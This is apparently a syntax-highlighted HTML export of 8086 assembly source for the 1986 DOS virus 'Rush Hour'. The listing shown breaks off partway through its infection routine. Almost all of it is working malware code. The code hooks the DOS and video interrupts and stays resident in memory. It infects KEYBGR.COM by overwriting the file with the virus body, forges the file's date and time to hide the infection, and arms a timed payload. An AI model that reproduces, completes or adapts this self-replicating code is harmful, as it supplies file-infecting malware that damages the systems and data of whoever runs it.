<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">PAGE</span><span class="sc0">   </span><span class="sc2">72</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
          </span><span class="sc9">TITLE</span><span class="sc0">        </span><span class="sc5">Virus</span><span class="sc0"> </span><span class="sc3">"RUSH HOUR"</span><span class="sc0">             </span><span class="sc4">(</span><span class="sc5">p</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">Foxi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1986</span><span class="sc0">

          </span><span class="sc9">NAME</span><span class="sc0">        </span><span class="sc5">VIRUS</span><span class="sc0">

</span><span class="sc5">ABS0</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0">         </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc9">ORG</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">VIDEO_INT</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">              </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; VIDEO INTERRUPT</span><span class="sc0">
                                                </span><span class="sc1">; VECTOR</span><span class="sc0">
             </span><span class="sc9">ORG</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">DOS_INT</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">              </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; DOS          -"-</span><span class="sc0">
             </span><span class="sc9">ORG</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24H</span><span class="sc0">
</span><span class="sc5">ERROR_INT</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">              </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; ERROR        -"-</span><span class="sc0">
</span><span class="sc5">ABS0</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">CODE</span><span class="sc0">      </span><span class="sc9">SEGMENT</span><span class="sc0">
          </span><span class="sc9">ASSUME</span><span class="sc0">      </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

             </span><span class="sc9">ORG</span><span class="sc0">      </span><span class="sc2">05CH</span><span class="sc0">
</span><span class="sc5">FCB</span><span class="sc0">          </span><span class="sc9">LABEL</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0">
</span><span class="sc5">DRIVE</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FSPEC</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Filename</span><span class="sc0">
             </span><span class="sc9">ORG</span><span class="sc0">      </span><span class="sc2">6CH</span><span class="sc0">
</span><span class="sc5">FSIZE</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FDATE</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; date of last</span><span class="sc0">
                                                </span><span class="sc1">; modification</span><span class="sc0">
</span><span class="sc5">FTIME</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; time  -"-     -"-</span><span class="sc0">
             </span><span class="sc9">ORG</span><span class="sc0">      </span><span class="sc2">80H</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">       </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Disk Transfer Area</span><span class="sc0">

             </span><span class="sc9">ORG</span><span class="sc0">      </span><span class="sc2">071EH</span><span class="sc0">                     </span><span class="sc1">; end of the normal</span><span class="sc0">
                                                </span><span class="sc1">; KEYBGR.COM</span><span class="sc0">

             </span><span class="sc6">XOR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                     </span><span class="sc1">; ES points to ABS0</span><span class="sc0">
             </span><span class="sc9">ASSUME</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">ABS0</span><span class="sc0">

             </span><span class="sc6">PUSH</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">      </span><span class="sc8">DS</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">VIDEO_INT</span><span class="sc0">              </span><span class="sc1">; store old</span><span class="sc0">
                                                </span><span class="sc1">; interrupt vectors</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">VIDEO_INT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">VIDEO_VECTOR</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">VIDEO_VECTOR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">DOS_INT</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">DOS_INT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DOS_VECTOR</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DOS_VECTOR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">CLI</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc5">DOS_INT</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">      </span><span class="sc1">; new DOS vector</span><span class="sc0">
                                                </span><span class="sc1">; points to</span><span class="sc0">
                                                </span><span class="sc1">; VIRUS</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc5">DOS_INT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc5">VIDEO_INT</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DISEASE</span><span class="sc0">  </span><span class="sc1">; video vector</span><span class="sc0">
                                                </span><span class="sc1">; points to DISEASE</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc5">VIDEO_INT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
             </span><span class="sc6">STI</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">      </span><span class="sc2">1AH</span><span class="sc0">                       </span><span class="sc1">; read TimeOfDay (TOD)</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc5">TIME_0</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">

             </span><span class="sc6">LEA</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">VIRUS_ENDE</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">      </span><span class="sc2">27H</span><span class="sc0">                       </span><span class="sc1">; terminate program</span><span class="sc0">
                                                </span><span class="sc1">; remain resident.</span><span class="sc0">

</span><span class="sc5">VIDEO_VECTOR</span><span class="sc0">          </span><span class="sc9">Dd</span><span class="sc0">           </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DOS_VECTOR</span><span class="sc0">            </span><span class="sc9">Dd</span><span class="sc0">           </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ERROR_VECTOR</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">           </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">TIME_0</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; VIRUS main program:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1. System call  AH=4BH ?</span><span class="sc0">
</span><span class="sc1">;    No   : --&gt; 2.</span><span class="sc0">
</span><span class="sc1">;    Yes  : Test KEYBGR.COM on specified drive</span><span class="sc0">
</span><span class="sc1">;           Already infected?</span><span class="sc0">
</span><span class="sc1">;           Yes  : --&gt; 3.</span><span class="sc0">
</span><span class="sc1">;           No   : INFECTION !</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2. Jump to normal DOS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">RNDVAL</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">          </span><span class="sc12">'bfhg'</span><span class="sc0">
</span><span class="sc5">ACTIVE</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; not active</span><span class="sc0">

</span><span class="sc5">PRESET</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; first virus not</span><span class="sc0">
                                                </span><span class="sc1">; active!</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0">          </span><span class="sc12">'A:'</span><span class="sc0">
</span><span class="sc5">FNAME</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">          </span><span class="sc12">'KEYBGR   COM'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">VIRUS</span><span class="sc0">        </span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc10">FAR</span><span class="sc0">
             </span><span class="sc9">ASSUME</span><span class="sc0">      </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">

             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; check if at least 15</span><span class="sc0">
                                                </span><span class="sc1">; min.</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">         </span><span class="sc2">1AH</span><span class="sc0">                    </span><span class="sc1">; have elapsed</span><span class="sc0">
                                                </span><span class="sc1">; since</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">TIME_0</span><span class="sc0">              </span><span class="sc1">; installation.</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">16384</span><span class="sc0">               </span><span class="sc1">; (16384 ticks of the</span><span class="sc0">
                                                </span><span class="sc1">; clock=15 min.)</span><span class="sc0">
             </span><span class="sc6">JL</span><span class="sc0">          </span><span class="sc5">$3</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">ACTIVE</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; if so, activate</span><span class="sc0">
                                                </span><span class="sc1">; virus.</span><span class="sc0">

</span><span class="sc5">$3</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">CX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc0">
                                                </span><span class="sc1">; disk access</span><span class="sc0">
                                                </span><span class="sc1">; because of the</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B00H</span><span class="sc0">               </span><span class="sc1">; DOS command</span><span class="sc0">
             </span><span class="sc6">JE</span><span class="sc0">          </span><span class="sc5">$1</span><span class="sc0">                     </span><span class="sc1">; "Load and execute</span><span class="sc0">
                                                </span><span class="sc1">; program" ?</span><span class="sc0">
</span><span class="sc5">EXIT_1</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">         </span><span class="sc5">DOS_VECTOR</span><span class="sc0">        </span><span class="sc1">; No : --&gt; continue as normal</span><span class="sc0">

</span><span class="sc5">$1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc0">                     </span><span class="sc1">; ES:BX    --&gt;</span><span class="sc0">
                                                </span><span class="sc1">;        parameter block</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc0">                     </span><span class="sc1">; DS:DX    --&gt;  filename</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc0">                     </span><span class="sc1">; save registers which</span><span class="sc0">
                                                </span><span class="sc1">; will be needed</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc0">                     </span><span class="sc1">; for INT 21H</span><span class="sc0">
                                                </span><span class="sc1">; (AH=4BH)</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">DRIVE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Set the drive</span><span class="sc0">
                                                </span><span class="sc1">; of the</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; program to be</span><span class="sc0">
                                                </span><span class="sc1">; executed</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
             </span><span class="sc6">JNE</span><span class="sc0">         </span><span class="sc5">$5</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">DRIVE</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">

</span><span class="sc5">$5</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">CLD</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">DS</span><span class="sc0">
             </span><span class="sc6">XOR</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc9">ASSUME</span><span class="sc0">      </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">ABS0</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">ERROR_INT</span><span class="sc0">           </span><span class="sc1">; Ignore all</span><span class="sc0">
                                                </span><span class="sc1">; disk "errors"</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">ERROR_INT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; with our own</span><span class="sc0">
                                                </span><span class="sc1">; error routine</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">ERROR_VECTOR</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">ERROR_VECTOR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">ERROR_INT</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc10">ERROR</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">ERROR_INT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">

             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc9">ASSUME</span><span class="sc0">      </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

             </span><span class="sc6">LEA</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">DTA</span><span class="sc0">                 </span><span class="sc1">; Disk Transfer Area</span><span class="sc0">
                                                </span><span class="sc1">; select</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">         </span><span class="sc2">21H</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">                  </span><span class="sc1">; transfer the</span><span class="sc0">
                                                </span><span class="sc1">; filename</span><span class="sc0">
</span><span class="sc5">$2</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">FNAME</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; into FileControlBlock</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">FSPEC</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
             </span><span class="sc6">DEC</span><span class="sc0">         </span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">         </span><span class="sc5">$2</span><span class="sc0">

             </span><span class="sc6">LEA</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FCB</span><span class="sc0">                 </span><span class="sc1">; open file ( for</span><span class="sc0">
                                                </span><span class="sc1">; writing )</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">         </span><span class="sc2">21H</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">JNE</span><span class="sc0">         </span><span class="sc5">EXIT_0</span><span class="sc0">                 </span><span class="sc1">; file does not exist -</span><span class="sc0">
                                                </span><span class="sc1">; -&gt; end</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">fcb</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">FTIME</span><span class="sc0">               </span><span class="sc1">; file already infected ?</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4800H</span><span class="sc0">
             </span><span class="sc6">JE</span><span class="sc0">          </span><span class="sc5">EXIT_0</span><span class="sc0">                 </span><span class="sc1">; YES --&gt; END</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">PRESET</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; (All copies are</span><span class="sc0">
                                                </span><span class="sc1">; virulent !)</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                </span><span class="sc1">; write the VIRUS in</span><span class="sc0">
                                                </span><span class="sc1">; the file</span><span class="sc0">
</span><span class="sc5">$4</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">LEA</span><span class="sc0">         </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">DTA</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">
             </span><span class="sc6">REP</span><span class="sc0">         </span><span class="sc6">MOVSB</span><span class="sc0">
             </span><span class="sc6">LEA</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FCB</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">15H</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">         </span><span class="sc2">21H</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">         </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENDE</span><span class="sc0">
             </span><span class="sc6">JL</span><span class="sc0">          </span><span class="sc5">$4</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">FSIZE</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENDE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; set correct</span><span class="sc0">
                                                </span><span class="sc1">; file size</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">FDATE</span><span class="sc4">,</span><span class="sc2">0AA3H</span><span class="sc0">            </span><span class="sc1">; set correct date</span><span class="sc0">
                                                </span><span class="sc1">; (03-05-86)</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">FTIME</span><span class="sc4">,</span><span class="sc2">4800H</span><span class="sc0">            </span><span class="sc1">;    -"-      time</span><span class="sc0">
                                                </span><span class="sc1">; (09:00:00)</span><span class="sc0">

             </span><span class="sc6">LEA</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FCB</span><span class="sc0">                 </span><span class="sc1">; close file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">         </span><span class="sc2">21H</span><span class="sc0">

             </span><span class="sc6">XOR</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc9">ASSUME</span><span class="sc0">      </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">ABS0</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">ERROR_VECTOR</span><span class="sc0">        </span><span class="sc1">; reset the error</span><span class="sc0">
                                                </span><span class="sc1">; interrupt</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">ERROR_VECTOR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">ERROR_INT</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc5">ERROR_INT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">

</span><span class="sc5">EXIT_0</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">DX</span><span class="sc0">                     </span><span class="sc1">; restore the saved</span><span class="sc0">
                                                </span><span class="sc1">; registers</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">DS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc9">ASSUME</span><span class="sc0">      </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B00H</span><span class="sc0">
